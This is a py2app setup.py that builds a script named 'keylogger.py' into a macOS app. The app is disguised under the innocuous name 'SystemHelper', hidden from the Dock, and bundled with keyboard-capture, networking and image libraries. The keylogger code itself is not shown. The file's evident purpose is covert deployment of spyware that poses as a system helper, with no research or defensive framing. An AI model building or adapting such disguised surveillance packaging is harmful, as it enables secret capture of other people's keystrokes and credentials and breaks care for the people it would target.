from setuptools import setup

APP = ['keylogger.py']
DATA_FILES = []
OPTIONS = { 
    'argv_emulation': False,
    'packages': ['pynput', 'requests', 'PIL'],
    'iconfile': 'icon.icns',
    'plist': {
        'CFBundleName': 'SystemHelper',
        'CFBundleDisplayName': 'SystemHelper',
        'LSUIElement': True  
    },
}

setup(
    app=APP,
    data_files=DATA_FILES,
    options={'py2app': OPTIONS},
    setup_requires=['py2app'],
)
